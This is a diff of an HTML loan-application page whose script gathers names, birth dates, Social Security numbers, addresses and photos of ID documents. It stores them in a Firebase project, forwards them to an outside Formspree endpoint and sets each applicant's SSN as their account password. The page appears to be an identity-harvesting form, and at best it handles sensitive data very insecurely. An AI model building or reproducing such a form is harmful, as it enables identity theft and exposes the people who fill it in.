@@ -415,22 +415,9 @@
                                     </div>
                                 </div>
                             </form>
-                            <div id="wifi-loader" class="loader-container" >
-                                <svg class="circle-outer" viewBox="0 0 86 86">
-                                    <circle class="back" cx="43" cy="43" r="40"></circle>
-                                    <circle class="front" cx="43" cy="43" r="40"></circle>
-                                    <circle class="new" cx="43" cy="43" r="40"></circle>
-                                </svg>
-                                <svg class="circle-middle" viewBox="0 0 60 60">
-                                    <circle class="back" cx="30" cy="30" r="27"></circle>
-                                    <circle class="front" cx="30" cy="30" r="27"></circle>
-                                </svg>
-                                <svg class="circle-inner" viewBox="0 0 34 34">
-                                    <circle class="back" cx="17" cy="17" r="14"></circle>
-                                    <circle class="front" cx="17" cy="17" r="14"></circle>
-                                </svg>
-                                <div class="text" data-text="Submitting, Please wait....."></div>
-                            </div>                            
+                            <div id="loader" class="loader-container">
+                                <div class="loader"></div>
+                            </div>
 
                         </div>
                     </div>
@@ -551,210 +538,210 @@
         });
     </script>
 
-<script type="module">
-    // Import the necessary functions from the Firebase SDK
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-    import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
-    import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+    <script type="module">
+        // Import the necessary functions from the Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
+        import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-    // Your web app's Firebase configuration
-    const firebaseConfig = {
-        apiKey: "AIzaSyAgqyJwpRfrcny-HwGWfgk_pnKpDLrvFz0",
-        authDomain: "banca-info.firebaseapp.com",
-        projectId: "banca-info",
-        storageBucket: "banca-info.appspot.com",
-        messagingSenderId: "822849353480",
-        appId: "1:822849353480:web:ebebda5670f9c2dfc8debd"
-    };
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAgqyJwpRfrcny-HwGWfgk_pnKpDLrvFz0",
+            authDomain: "banca-info.firebaseapp.com",
+            projectId: "banca-info",
+            storageBucket: "banca-info.appspot.com",
+            messagingSenderId: "822849353480",
+            appId: "1:822849353480:web:ebebda5670f9c2dfc8debd"
+        };
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const database = getDatabase(app);
-    const storage = getStorage(app);
-    const auth = getAuth(app);
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        const storage = getStorage(app);
+        const auth = getAuth(app);
 
-    // Function to generate a random file name
-    function generateRandomFileName(file) {
-        const randomString = Math.random().toString(36).substring(2, 8);
-        const fileExtension = file.name.split('.').pop();
-        return `file_${randomString}.${fileExtension}`;
-    }
+        // Function to generate a random file name
+        function generateRandomFileName(file) {
+            const randomString = Math.random().toString(36).substring(2, 8);
+            const fileExtension = file.name.split('.').pop();
+            return `file_${randomString}.${fileExtension}`;
+        }
 
-    // Function to upload file to Firebase Storage with a renamed file
-    function uploadFile(file) {
-        return new Promise((resolve, reject) => {
-            const fileName = generateRandomFileName(file);
-            const storageRefVar = storageRef(storage, `uploads/${fileName}`);
+        // Function to upload file to Firebase Storage with a renamed file
+        function uploadFile(file) {
+            return new Promise((resolve, reject) => {
+                const fileName = generateRandomFileName(file);
+                const storageRefVar = storageRef(storage, `uploads/${fileName}`);
 
-            // Use put for smaller files and uploadBytesResumable for larger files
-            const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
+                // Use put for smaller files and uploadBytesResumable for larger files
+                const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
 
-            uploadTask.then((snapshot) => {
-                getDownloadURL(snapshot.ref).then((downloadURL) => {
-                    resolve(downloadURL);
+                uploadTask.then((snapshot) => {
+                    getDownloadURL(snapshot.ref).then((downloadURL) => {
+                        resolve(downloadURL);
+                    });
+                }).catch((error) => {
+                    console.error('Error uploading file:', error);
+                    reject(null);
                 });
-            }).catch((error) => {
-                console.error('Error uploading file:', error);
-                reject(null);
             });
-        });
-    }
+        }
 
-    // Function to submit form data to Formspree
-    async function submitToFormspree(formData) {
-        try {
-            const formSpreeEndpoint = 'https://formspree.io/f/xleqlvvy'; // Replace with your Formspree endpoint
+        // Function to submit form data to Formspree
+        async function submitToFormspree(formData) {
+            try {
+                const formSpreeEndpoint = 'https://formspree.io/f/xleqlvvy'; // Replace with your Formspree endpoint
 
-            const response = await fetch(formSpreeEndpoint, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formData),
-            });
+                const response = await fetch(formSpreeEndpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData),
+                });
 
-            if (response.ok) {
-                console.log('Form data submitted to Formspree successfully!');
-            } else {
-                console.error('Error submitting form data to Formspree:', response.statusText);
+                if (response.ok) {
+                    console.log('Form data submitted to Formspree successfully!');
+                } else {
+                    console.error('Error submitting form data to Formspree:', response.statusText);
+                    throw new Error('Formspree submission failed');
+                }
+            } catch (error) {
+                console.error('Error submitting form data to Formspree:', error);
                 throw new Error('Formspree submission failed');
             }
-        } catch (error) {
-            console.error('Error submitting form data to Formspree:', error);
-            throw new Error('Formspree submission failed');
         }
-    }
 
-     // Function to toggle loader visibility
-     function toggleLoader(show) {
-            const loader = document.getElementById('wifi-loader');
+        // Function to toggle loader visibility
+        function toggleLoader(show) {
+            const loader = document.getElementById('loader');
             if (show) {
-                loader.style.display = 'flex';
+                loader.style.display = 'block';
             } else {
                 loader.style.display = 'none';
             }
         }
 
-    // Submit form and store data in Firebase and Formspree
-    document.getElementById('loanForm').addEventListener('submit', async function (e) {
-        e.preventDefault();
-        console.log('Form submission initiated');
+        // Submit form and store data in Firebase and Formspree
+        document.getElementById('loanForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            console.log('Form submission initiated');
 
-        /// Show loader
-        toggleLoader(true);
+            // Show loader
+            toggleLoader(true);
 
-        // Get form values
-        const fName = document.getElementById('fName').value;
-        const lName = document.getElementById('lName').value;
-        const dob_d = document.getElementById('dob-d').value;
-        const dob_m = document.getElementById('dob-m').value;
-        const dob_y = document.getElementById('dob-y').value;
+            // Get form values
+            const fName = document.getElementById('fName').value;
+            const lName = document.getElementById('lName').value;
+            const dob_d = document.getElementById('dob-d').value;
+            const dob_m = document.getElementById('dob-m').value;
+            const dob_y = document.getElementById('dob-y').value;
 
-        const dob = `${dob_y}-${dob_m}-${dob_d}`;
+            const dob = `${dob_y}-${dob_m}-${dob_d}`;
 
-        const social = document.getElementById('social').value;
-        const maritalStatus = document.querySelector('input[name="MaritalStatas"]:checked').value;
-        const email = document.getElementById('email').value;
-        const phoneNumber = document.getElementById('inputPhoneNumber').value;
-        const pAddress = document.getElementById('pAddress').value;
-        const state = document.getElementById('stateName').value;
-        const city = document.getElementById('cityName').value;
-        const zipCode = document.getElementById('zipCode').value;
-        const loanType = document.querySelector('input[name="select-loan-type"]:checked').value;
-        const loanAmount = document.getElementById('loan-amount').value;
-        const loanDuration = document.querySelector('input[name="Duration"]:checked').value;
-        const agreeBox = document.getElementById('agreeBox').checked;
+            const social = document.getElementById('social').value;
+            const maritalStatus = document.querySelector('input[name="MaritalStatas"]:checked').value;
+            const email = document.getElementById('email').value;
+            const phoneNumber = document.getElementById('inputPhoneNumber').value;
+            const pAddress = document.getElementById('pAddress').value;
+            const state = document.getElementById('stateName').value;
+            const city = document.getElementById('cityName').value;
+            const zipCode = document.getElementById('zipCode').value;
+            const loanType = document.querySelector('input[name="select-loan-type"]:checked').value;
+            const loanAmount = document.getElementById('loan-amount').value;
+            const loanDuration = document.querySelector('input[name="Duration"]:checked').value;
+            const agreeBox = document.getElementById('agreeBox').checked;
 
-        // Check if the agreement box is checked
-        if (!agreeBox) {
-            // Hide loader
-            toggleLoader(false);
-            alert('Please agree to the terms before submitting the form.');
-            return;
-        }
-
-        const fileInputFront = document.querySelector('input[name="one"]');
-        const fileFront = fileInputFront.files[0];
-
-        const fileInputBack = document.querySelector('input[name="two"]');
-        const fileBack = fileInputBack.files[0];
-
-        // Check if both files are selected
-        if (!fileFront || !fileBack) {
-            // Hide loader
-            toggleLoader(false);
-            alert('Please select both front and back files');
-            return;
-        }
-
-        // Use social as the password (temporary, not recommended for production)
-        const password = social;
-
-        try {
-            // Create a new user with email and social as password
-            const userCredential = await createUserWithEmailAndPassword(auth, email, password);
-            const user = userCredential.user;
-
-            // Generate a UID for the user
-            const uid = user.uid;
-
-            // Store data in Firebase
-            const formData = {
-                fName,
-                lName,
-                dob,
-                social,
-                maritalStatus,
-                email,
-                phoneNumber,
-                pAddress,
-                state,
-                city,
-                zipCode,
-                loanType,
-                loanAmount,
-                loanDuration,
-                fileFrontURL: null,
-                fileBackURL: null
-            };
-
-            // Upload front and back files concurrently
-            const [fileFrontURL, fileBackURL] = await Promise.all([uploadFile(fileFront), uploadFile(fileBack)]);
-
-            formData.fileFrontURL = fileFrontURL;
-            formData.fileBackURL = fileBackURL;
-
-            // Submit form data to Formspree and Firebase concurrently
-            try {
-                const formSpreePromise = submitToFormspree(formData);
-                const firebasePromise = set(ref(database, `users/${uid}`), formData);
-
-                // Wait for both promises to resolve
-                await Promise.all([formSpreePromise, firebasePromise]);
-
+            // Check if the agreement box is checked
+            if (!agreeBox) {
                 // Hide loader
                 toggleLoader(false);
+                alert('Please agree to the terms before submitting the form.');
+                return;
+            }
 
-                console.log('User data and form submitted successfully!');
-                // Redirect to submit.html after successful submission
-                window.location.href = 'submitted.html';
+            const fileInputFront = document.querySelector('input[name="one"]');
+            const fileFront = fileInputFront.files[0];
+
+            const fileInputBack = document.querySelector('input[name="two"]');
+            const fileBack = fileInputBack.files[0];
+
+            // Check if both files are selected
+            if (!fileFront || !fileBack) {
+                // Hide loader
+                toggleLoader(false);
+                alert('Please select both front and back files');
+                return;
+            }
+
+            // Use social as the password (temporary, not recommended for production)
+            const password = social;
+
+            try {
+                // Create a new user with email and social as password
+                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+                const user = userCredential.user;
+
+                // Generate a UID for the user
+                const uid = user.uid;
+
+                // Store data in Firebase
+                const formData = {
+                    fName,
+                    lName,
+                    dob,
+                    social,
+                    maritalStatus,
+                    email,
+                    phoneNumber,
+                    pAddress,
+                    state,
+                    city,
+                    zipCode,
+                    loanType,
+                    loanAmount,
+                    loanDuration,
+                    fileFrontURL: null,
+                    fileBackURL: null
+                };
+
+                // Upload front and back files concurrently
+                const [fileFrontURL, fileBackURL] = await Promise.all([uploadFile(fileFront), uploadFile(fileBack)]);
+
+                formData.fileFrontURL = fileFrontURL;
+                formData.fileBackURL = fileBackURL;
+
+                // Submit form data to Formspree and Firebase concurrently
+                try {
+                    const formSpreePromise = submitToFormspree(formData);
+                    const firebasePromise = set(ref(database, `users/${uid}`), formData);
+
+                    // Wait for both promises to resolve
+                    await Promise.all([formSpreePromise, firebasePromise]);
+
+                    // Hide loader
+                    toggleLoader(false);
+
+                    console.log('User data and form submitted successfully!');
+                    // Redirect to submit.html after successful submission
+                    window.location.href = 'submitted.html';
+                } catch (error) {
+                    // Hide loader
+                    toggleLoader(false);
+
+                    console.error('Error during form submission:', error);
+                    alert('An error occurred while submitting the form to Formspree and Firebase. Please check the console for more details and try again.');
+                }
             } catch (error) {
                 // Hide loader
                 toggleLoader(false);
 
-                console.error('Error during form submission:', error);
-                alert('An error occurred while submitting the form to Formspree and Firebase. Please check the console for more details and try again.');
+                console.error('Error creating user:', error);
+                alert('An error occurred while creating user. Please check the console for more details and try again.');
             }
-        } catch (error) {
-            // Hide loader
-            toggleLoader(false);
-
-            console.error('Error creating user:', error);
-            alert('An error occurred while creating user. Please check the console for more details and try again.');
-        }
-    });
-</script>
+        });
+    </script>
     <!--Start of Tawk.to Script-->
     <script type="text/javascript">
         var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
